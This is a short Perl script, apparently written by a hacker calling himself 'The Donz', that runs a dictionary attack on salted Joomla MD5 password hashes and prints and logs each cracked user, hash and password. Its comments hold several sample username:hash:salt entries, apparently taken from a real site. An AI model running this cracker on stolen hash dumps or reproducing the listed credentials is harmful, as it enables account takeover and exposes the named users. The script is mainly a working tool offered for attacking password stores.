#!/usr/bin/perl
#The Donz writes this c0de coz has nothin' to do
#
#Example "Joomla hash" used by this script.
# admin:3714c0258224d6bfc12d37f9e5b5dd91:cwOO62YrNFcRvEDw:25: 
# aasim1:54caf07c943036c8cb654533401df2c1:gOKEiWSqGYwT45I8:25: 
# westernunion:88c272781e915fc2ec7d381706556468:EZrpMP6GEBOkvTVz:25: 
# deanfriesen:1090e6c21ed9d0be822e2c7c10109fc5:1TGhXTRbNbnRpiFP:25: 
# joycelyndavid:12bdc9215f5e0f5e935c391a014c457e:18: 

#Example how to use.

#  perl this.pl hash.txt /usr/share/dict/words

#

use Digest::MD5 qw(md5_hex);
use POSIX;

my (@hashlist,@plaintext);
my ($i,$j);
my $combine;
my $MAXCHILD=200;
my @got;

if(!$ARGV[0])
{
  print "usage :\t $0 <joomla hash> <wordlist>\n";
  exit;
}

open(LOG, ">>crack.log");
open(HASH,"<$ARGV[0]");
chop(@hashlist=<HASH>);
open(PLAIN,"<$ARGV[1]");
chop(@plaintext=<PLAIN>);
for($j=0;$j<=$#plaintext;$j++){
  for($i=0;$i<=$#hashlist;$i++){
    @got=split(/:/,$hashlist[$i]);
    $combine = $plaintext[$j] . $got[2];
    if(md5_hex($combine) eq $got[1]){
      print "Found hash/plain/user = " . $got[1].":".$got[2] . " / " . $plaintext[$j] . " / " . $got[0] . "\n";
      print LOG "Found hash/plain/user = " . $got[1].":".$got[2] . " / " . $plaintext[$j] . " / " . $got[0] . "\n";
    }
  }
}
close(PLAIN);
close(HASH);
close(LOG);


